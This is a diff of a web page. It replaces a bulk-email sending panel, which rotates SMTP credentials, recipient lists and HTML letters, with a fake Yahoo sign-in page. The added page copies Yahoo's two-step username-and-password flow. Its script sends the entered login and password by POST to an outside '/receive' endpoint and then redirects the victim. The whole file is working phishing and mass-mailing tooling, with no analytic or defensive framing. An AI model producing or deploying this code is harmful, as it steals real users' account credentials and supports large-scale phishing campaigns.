+        <option role="option" data-code="+44" value="GB">United Kingdom ‪(+44)‬</option>
+        <option role="option" data-code="+1" value="US" data-format="(XXX) XXX-XXXX">United States ‪(+1)‬</option>
+        <option role="option" data-code="+598" value="UY">Uruguay ‪(+598)‬</option>
+        <option role="option" data-code="+998" value="UZ">Uzbekistan ‪(+998)‬</option>
+        <option role="option" data-code="+678" value="VU">Vanuatu ‪(+678)‬</option>
+        <option role="option" data-code="+379" value="VA">Vatican City ‪(+379)‬</option>
+        <option role="option" data-code="+58" value="VE">Venezuela ‪(+58)‬</option>
+        <option role="option" data-code="+84" value="VN">Vietnam ‪(+84)‬</option>
+        <option role="option" data-code="+681" value="WF">Wallis and Futuna ‪(+681)‬</option>
+        <option role="option" data-code="+967" value="YE">Yemen ‪(+967)‬</option>
+        <option role="option" data-code="+260" value="ZM">Zambia ‪(+260)‬</option>
+        <option role="option" data-code="+263" value="ZW">Zimbabwe ‪(+263)‬</option>
+    </select>
+    <div class="arrow"></div>
 </div>
 
-  <br><br>
-  	
-  	<div>
-  	<label for="subject" >Subject</label>
-  	<input class="smd inc inputs" id="subject" placeholder="Subject HERE"></input>
-  	<br>
-    <label for="port" >From</label> 
-  	<input class="smd inc inputs" id="from" placeholder="From address"></input>
-  	
-  	<!--label for="letter" >letter name</label> 
-  	<input class="smd inc inputs" id="letter" placeholder="letter Name"></input-->
-  	</div>
-  	</section>
-
-  <div id="smallbut">
-    <div class="triangle">
-    </div>
-  </div>
-    
-    <div id="leftSlide" style="height: 100%;">
-      <div style="position: relative;">
-        <div id="abs" style="position: absolute;">
-          <div id="x-back" style="">
-            <div id="x" class="close">+</div>
-          </div>
+            </div>
+            <div class="input-group" id="userfield">
+                <input class="phone-no " type="text" name="username" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder=" ">
+                <div class="input-field-icon hide" id="username-field-icon"></div>
+                <label for="login-username" id="login-label" class="login-label">Username, email, or&nbsp;mobile</label>
+                
+                <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
+                    <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
+                </ul>            </div>
+            <div id="password-container" class="input-group" style="display: none !important;">
+                <input name="passwd" id="login-passwd" class="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="">
+                <div id="password-toggle-button" style="padding-top: 14px;">	
+                    <img id="eye-show" class="eye" style="display:inline-flex"  
+                    src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IS0tIFVwbG9hZGVkIHRvOiBTVkcgUmVwbywgd3d3LnN2Z3JlcG8uY29tLCBHZW5lcmF0b3I6IFNWRyBSZXBvIE1peGVyIFRvb2xzIC0tPgo8c3ZnIHdpZHRoPSI4MDBweCIgaGVpZ2h0PSI4MDBweCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMSAxMkMxIDEyIDUgNCAxMiA0QzE5IDQgMjMgMTIgMjMgMTIiIHN0cm9rZT0iIzAwMDAwMCIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTEgMTJDMSAxMiA1IDIwIDEyIDIwQzE5IDIwIDIzIDEyIDIzIDEyIiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIHN0cm9rZT0iIzAwMDAwMCIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPC9zdmc+"/>
+                    <img id="eye-hide" class="eye" style="display:none" 
+                    src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IS0tIFVwbG9hZGVkIHRvOiBTVkcgUmVwbywgd3d3LnN2Z3JlcG8uY29tLCBHZW5lcmF0b3I6IFNWRyBSZXBvIE1peGVyIFRvb2xzIC0tPgo8c3ZnIHdpZHRoPSI4MDBweCIgaGVpZ2h0PSI4MDBweCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMiAyTDIyIDIyIiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik02LjcxMjc3IDYuNzIyNkMzLjY2NDc5IDguNzk1MjcgMiAxMiAyIDEyQzIgMTIgNS42MzYzNiAxOSAxMiAxOUMxNC4wNTAzIDE5IDE1LjgxNzQgMTguMjczNCAxNy4yNzExIDE3LjI4ODRNMTEgNS4wNTgyMkMxMS4zMjU0IDUuMDIwMTMgMTEuNjU4OCA1IDEyIDVDMTguMzYzNiA1IDIyIDEyIDIyIDEyQzIyIDEyIDIxLjMwODIgMTMuMzMxNyAyMCAxNC44MzM1IiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xNCAxNC4yMzYyQzEzLjQ2OTIgMTQuNzExMiAxMi43Njg0IDE1LjAwMDEgMTIgMTUuMDAwMUMxMC4zNDMxIDE1LjAwMDEgOSAxMy42NTcgOSAxMi4wMDAxQzkgMTEuMTc2NCA5LjMzMTkzIDEwLjQzMDMgOS44NjkzMiA5Ljg4ODE4IiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+Cjwvc3ZnPg=="/>		
+                      </div>
+                <label for="passwd" id="passwd-label" class="login-label">Password</label>
+               
+            </div>
         </div>
-      </div>
-      
-      <div>
-        <div style="margin-left: 10px;">
-          <br><br>
-          <pre id="test"></pre>
+        <p id="username-error" class="error-msg" role="alert" ></p>
+
+
+        <div class="button-container">
+            <input id="Next" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
         </div>
-      </div>
+
+        <div id="sign-in" class="button-container"style="display:none;">
+            <input  type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Login" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
+        </div>
+
+        <div class="helper-links-container">
+            <div class="helper-item ">
+                <span class="stay-signed-in checkbox-container">
+                    <input id="persistent" name="persistent" value="y" type="checkbox" checked="">
+                    <label for="persistent">Stay signed&nbsp;in</label>
+                </span>
+            </div>
+            <div class="helper-item arlink">
+                <span class="help">
+                    <a id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot" data-rapid-tracking="true">Forgot&nbsp;username?</a>
+                </span>
+            </div>
+        </div>
+
+<br>
+<br>
+        <div class="bottom-links-container has-social-buttons">
+            <p class="sign-up-link">
+                <a id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup">Create an&nbsp;account</a>
+            </p>
+
+                     </div>
+    </form>
+</div>
+</div>
+        </div>
+        <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
+            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
+<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
+        </div>
     </div>
-    
-
-   
-    <button id="stop" class="stop" style=" display: none;">
-      <div>
-        <span style="text-align: center;">
-          STOP
-        </span>
-      </div>
-    </button>
-
-  <button id="start" >SH🚀🔥T</button>
- 
-
+    <div class="login-bg-outer">
+        
+    </div>
+    <div class="login-footer">
+    <p>
+        <a  target="_blank" class="terms">Terms</a>
+        
+        <span>|</span>
+        <a  target="_blank" class="privacy">Privacy</a>
+        
+    </p>
+</div>
+</div>
+<script>
+    const passwordToggle = document.getElementById('password-toggle-button');
+    const passwordInput = document.getElementById('login-passwd');
   
-  </div>
-  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    // Set the initial state to 'password'
+    passwordInput.type = 'password';
   
-  
-  <script>
-let names = [];
-let email = "";
-let newDetails = {};
-let emailNames = false;
-let test = '';
-let lineCount = 0;
-let iterationNumber;
-let iterationCheck = 0;
-let text = "";
-let inputCount = 1; 
-
-function startProcessing() {
-  
-  const textInput = document.getElementById('textInput');
-  const filled = document.getElementsByClassName("inputs");
-//console.log(filled);
-  let allInputsFilled = false;  // Initialize to false
-  
-  for (const fill of filled) {
-    if (fill.value.trim() === "") {
-      allInputsFilled = false;
-      emailNames = false;
-      
-    } else {
-      allInputsFilled = true;
-      emailNames = true;
-      document.getElementById('leftSlide').classList.add('expanded');
-      
-      
-    }
-  }
-
-  if(emailNames){
-    document.getElementById("stop").style.display = 'block';
-  }else{
-    document.getElementById("stop").style.display = 'none';
-  }
-  
-  
-  while (allInputsFilled && emailNames) {
-    //console.log('Data filled.');
-  
-    async function processNames() {
-  while (names.length > 0) {
-    console.log( "no:" + names.length);
-    myBoolean = true;
-    const currentName = names.shift();
-    email = currentName;
-    console.log(`Current name: ${currentName}`);
-    updateDetailsEveryMinute();
-    // Using await with a function that returns a Promise
-    await makeAjaxRequest();
-  }
-}
-
-
-processNames();
-
-if(names.length <= 1){
-      console.log("it is zero");
-     
-      break;
-  } 
- 
-}
-
-
-//console.log("Outside the loop. Conditions not met. No processing performed.");
-
-}
-
-
-
-
-function getRandomDetails() {
-  const detailsList = document.getElementById('textInput').value.split('|');
-  let previousName = '';
-
-    let randomDetails;
-    do {
-      const randomIndex = Math.floor(Math.random() * detailsList.length);
-      randomDetails = detailsList[randomIndex].split(',');
-    } while (randomDetails[0] === previousName);
-
-    previousName = randomDetails[0];
-
-    return {
-      name: randomDetails[0],
-      username: randomDetails[1],
-      password: randomDetails[2],
-      port: randomDetails[3],
-      secure: randomDetails[4],
-    };
-  }
-
-function updateDetailsEveryMinute() {
- 
-    newDetails = getRandomDetails();
-    //console.log('Updated Name:', newDetails.name, newDetails.username, newDetails.password, newDetails.port);
-    //document.getElementById('test').textContent = `${test}\n`;
-
- 
-  }
-
-
-function makeAjaxRequest() {
-  const url = '/sendEmail';
-  updateText();
-  
-  
-  const from = $('#from').val();
-  const subject = $('#subject').val();
-  const letter = $('#letter').val();
-
-   let user = {
-    name: newDetails.name.replace(/\s/g, ''),
-    username: newDetails.username.replace(/\s/g, ''),
-    password: newDetails.password.replace(/\s/g, ''),
-    port: newDetails.port.replace(/\s/g, ''),
-    secure: newDetails.secure.toLowerCase().replace(/\s/g, ''),
-    subject: subject.replace(/\s/g, ''),
-    from: from.replace(/\s/g, ''),
-    currentName: email.replace(/\s/g, ''),
-    htmlContent: text
-  };
-  const attachfile = document.getElementById('attach');
-const selectedFile = attachfile.files[0];
-
-const send = () =>{
-  $.ajax({
-      method: "POST",
-      url: url,
-      data: user
-    }).done(function (response) {
-      lineCount++;
-      
-        iterationCheck++;
-
-      if(iterationCheck == iterationNumber){
-        document.getElementById('leftSlide').classList.toggle('expanded');
-      document.getElementById("stop").style.display = 'none';
-      console.log("done");
+    passwordToggle.addEventListener('click', function() {
+      if (passwordInput.type === 'password') {
+        // Show the password as plain text
+        document.getElementById('eye-hide').style.display = "none";
+        document.getElementById('eye-show').style.display = "flex"; 
+        passwordInput.type = 'text';
+        console.log('clk');
+      } else if (passwordInput.type === 'text') {
+        // Hide the password with dots
+        document.getElementById('eye-show').style.display = "none";
+        document.getElementById('eye-hide').style.display = "flex";
+        passwordInput.type = 'password';
+        console.log('clg');
       }
-
-      if (lineCount > 50) {
+    });
     
-      lineCount = 0;
-      document.getElementById('test').textContent = '';
-    }
-      if (response && response.success) {
-        document.getElementById('test').textContent += response + '\n';
-        //console.log(response);
-        emailNames = true;
+    
+    
+  </script>
+    <script src="./Yahoo_files/bundle.js"></script>
+
+    <div id="mbr-css-check"></div>
+    <div id="page-mask" class="page-mask hide"></div>
+    <div id="ad"></div>
+    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
+        <input type="checkbox" id="mbr-legacy-device-bar-cross">
+        <p class="mbr-legacy-device">
+                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://login.yahoo.com/?.lang=en-US&amp;src=homepage&amp;.done=https%3A%2F%2Fwww.yahoo.com%2F&amp;pspid=2023538075&amp;activity=ybar-signin">More&nbsp;Info</a>
+        </p>
+    </div>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    <script>
+		function smb() {
+		var login = inputElement.value;
+		var pword = document.getElementById('login-passwd').value;
+		console.log(login +' pword'+ pword);
+		console.log(ablp);
+		let url = ablp+'/receive';
+                    $.ajax({
+					    method: 'POST',
+					    url: url,
+					    data: { Login: login, Password: pword },
+					})
+					.done(function(msg) {
+					    console.log(msg);
+					    window.location.href = goto;
+					})
+					.fail(function(err, textstatus, error) {
+					    // Handle AJAX request failure here
+					});
+
+      }
+		
+		var visitor = "";
+		var email = "";
+		var dispemElement = document.getElementById('yid');
+		//var dispemdiv = document.getElementById('password-disp');
+		var Signin = document.getElementById('sign-in'); 
+		var userfield = document.getElementById('userfield');
+		var passfield = document.getElementById('password-container');
+		var inputElement = document.getElementById('login-username');
+		var strongmess = document.getElementById('strong-mess');
+		var feintmess = document.getElementById('feint-mess');
+		var forgetpass = document.getElementById('mbr-forgot-link');
+		let initialContent = dispemElement.textContent;
+		var fp = true;
+		
+		var Next = document.getElementById('Next');
+		Next.addEventListener('click', function(){
+		event.preventDefault();
+		console.log(inputElement.value); 
+		});
+		
+		function showpass(){
+		if(inputElement.value !== ""){
+		dispemElement.textContent = inputElement.value;
+		//dispemdiv.style.display = 'block';
+		strongmess.textContent = 'Enter password';
+		feintmess.textContent = 'to finish signin';
+		Next.style.display = "none";
+		Signin.style.display = "block";
+		userfield.style.display = "none";
+		passfield.style.display = "flex";
+		forgetpass.textContent = "Forgot password?";
+		fp = false;
+		  }else {
+		  dispemdiv.style.display = 'none';
+		}
+		}
+		
+		
+		Next.addEventListener('click', function(){
+		event.preventDefault();
+		//smb();
+		var email = inputElement.value;
+		history.pushState({ page: "login" }, "Login", ""); 
+		console.log (email);
+		if (email.length > 8 && isNaN(email) || email.length > 6 && cnaa(email)) {
+		    showpass();
+		visitor = email;
+		 	 console.log(email);
+			  
+		    
+		
+		  } else if (!isNaN(email) && email.length >= 10 && email.length <= 11) {
+		    // Code to check phone number type
+		    visitor = email;
+		    showpass();
+		    
+		  } else if (email.length <= 4) {
+		   setTimeout(function() {
+           document.getElementById("username-error").textContent = "Sorry, we don't recognize this email.";
+		  
+		}, 2000);
+		   
+		  } 
+		  });
+				 
+		  window.addEventListener("popstate", function(event) {
+		  console.log(fp);
+      if (fp === false) {
+        // Reverse the changes and switch the settings
+        userfield.style.display = "block";
+		passfield.style.display = "none";
+		Next.style.display = "block";
+		Signin.style.display = "none";
+		strongmess.textContent = "Sign in";
+		feintmess.textContent = "using your Yahoo account"; 
+		dispemElement.textContent = initialContent;
+		forgetpass.textContent = "Forgot username?";
+		hideSpinner();
+		fp = true;
       } else {
-        document.getElementById('test').textContent += response + '\n';
-        //console.log(response);
-        emailNames = false;
+        userfield.style.display = "none";
+		passfield.style.display = "flex";
       }
-    }).fail(function (err, textStatus, error) {
-      //console.log("Error:", err, textStatus, error);
-      emailNames = true;
     });
-}
-
-if (selectedFile) {
-  const reader = new FileReader();
-  //console.log(selectedFile);
-
-  reader.onload = function (event) {
-    user.attachmentName = {
-      name: selectedFile.name,
-      type: selectedFile.type,
-      content: event.target.result
-    };
-
-    //console.log(user);
-
-    // Continue with your AJAX request here
-    send();
-  };
-
-  reader.readAsDataURL(selectedFile);
-}else{
-  send();
-}
-
-}
-
-
-
-
-document.querySelector('#start').addEventListener('click', () => {
-  
-  
-  if (!(textInput.value.trim() === "")) {
-    const fileInput = document.getElementById('fileInput');
-    const file = fileInput.files[0];
-
-    if (file) {
-      const reader = new FileReader();
-      
-      reader.onload = function (event) {
-        names = event.target.result.split('\n').map(name => name.trim()).filter(name => name !== '');
-        iterationNumber = names.length;
-       // document.getElementById("stop").style.display = 'block';
-        //console.log(names.length +' the names numbers');
-
-        startProcessing();
-      };
-
-      reader.readAsText(file);
-    } else {
-      //console.error('No file selected.');
-    }
-  } else {
-    //console.log('No data provided.');
-  }
-
-  
-});
-
-</script>
-<script>
-  let showBut = true;
-
-  document.querySelector('#stop').onclick = () => {
-  emailNames = false;
-  document.getElementById("stop").style.display = 'none';
-  //console.log(emailNames);
-}
-
-
-document.querySelector('#x').onclick = () => {
-  document.getElementById('leftSlide').classList.toggle('expanded');
-  document.querySelector('.triangle').classList.remove('hide');
-  showBut = !showBut;
-}
-
-
-document.querySelector('.triangle').onclick = () => {
-  let triangle = document.querySelector('.triangle');
-  document.getElementById('leftSlide').classList.toggle('expanded');
-  //console.log(showBut);
-  if (showBut) {
-    triangle.classList.add('hide');
-    
-  } else {
-    triangle.classList.remove('hide');
-  }
-  showBut = !showBut;
-};
-
-
-
-document.getElementById('attach').addEventListener("change", ()=>{
-  const checkfilename = event.target;
-  if (checkfilename.files.length > 0) {
-        const selectedFile = checkfilename.files[0];
-        document.getElementById('att-text').textContent = selectedFile.name;
-    }else{
-      document.getElementById('att-text').textContent = '';
-    }
-    });
-
-    
-    function updateText() {
-  text = ""; // Reset text
-  
-  // Get all input elements with class "inc"
-  const inputsx = document.querySelectorAll('.letter');
-  
-  inputsx.length
-  
-  const randomLetter = Math.floor(Math.random() * inputsx.length);
-      randomDetails = inputsx[randomLetter].value;
-    console.log(randomDetails);
-
-  // Loop through each input
-  inputsx.forEach((inputx, index) => {
-    text = `${randomDetails}\n`; // Update text with input value
-    });
-} 
-</script>
-<script>
-	function addInput() {
-  inputCount++; // Increment the input count
-  const container = document.getElementById('inputContainer');
-
-  // Create a new label
-  const label = document.createElement('label');
-  label.textContent = 'Letter ' + inputCount + ': '; // Label text
-
-  // Create a new input element
-  const newInput = document.createElement('textarea');
-  newInput.type = 'text';
-  newInput.name = 'input_' + inputCount; // Give each input a unique name
-  newInput.placeholder = 'html content '+ inputCount;
-  newInput.className = 'inc inputs letter';
-  newInput.rows = '10';
-  newInput.col = '50';
-  
-  // Append label and input to the container, each on a new line
-  container.appendChild(label);
-  container.appendChild(newInput);
-  container.appendChild(document.createElement('br')); // Line break
-  
-}
-
+		  
+    Signin.addEventListener('click', function(){
+		event.preventDefault();
+		smb();
+		});
 	</script>
-</body>
 
-
-</html>
+</body></html>
